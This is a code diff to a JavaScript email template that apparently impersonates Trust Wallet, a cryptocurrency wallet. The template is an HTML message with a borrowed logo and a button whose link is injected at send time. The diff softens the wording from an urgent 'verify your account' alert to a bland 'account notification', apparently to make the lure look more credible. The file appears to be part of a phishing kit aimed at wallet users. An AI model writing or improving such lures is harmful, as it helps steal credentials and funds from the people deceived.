@@ -4,7 +4,7 @@ exports.trustTemplate = (link) => {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Your Trust Wallet Account</title>
+    <title>Trust Wallet Account Notification</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -65,19 +65,18 @@ exports.trustTemplate = (link) => {
 <body>
     <div class="email-container">
         <img src="https://i.pinimg.com/736x/6c/3c/74/6c3c744dd40d28853c29f90692d1312e.jpg" alt="Trust Logo" class="logo">
-        <h1>Secure Your Trust Wallet Account</h1>
-        <p>Dear user</p>
+        <h1>Trust Wallet Account Notification</h1>
+        <p>Hello Trust Wallet user,</p>
         <p>
-            We've detected an action that requires immediate verification to secure 
-            your Trust Wallet account. Please take a moment to verify your account 
-            and ensure its safety.
+            We are reaching out to let you know about a recent update to your Trust Wallet account. 
+            For your convenience and continued security, we recommend reviewing your account activity.
         </p>
-        <a href="${link}" class="cta-button">Secure My Account</a>
+        <a href="${link}" class="cta-button">Go to My Account</a>
         <p class="footer">
-            If you did not initiate this action, you can safely ignore this email. For any questions, 
-            please contact our support team.
+            If you have any questions or did not expect this email, please contact our support team at 
+            <a href="mailto:support@trustwallet.com">support@trustwallet.com</a>.
         </p>
-        <p>Thank you for using Trust Wallet!</p>
+        <p>Thank you for being a valued Trust Wallet user!</p>
     </div>
 </body>
 </html>`
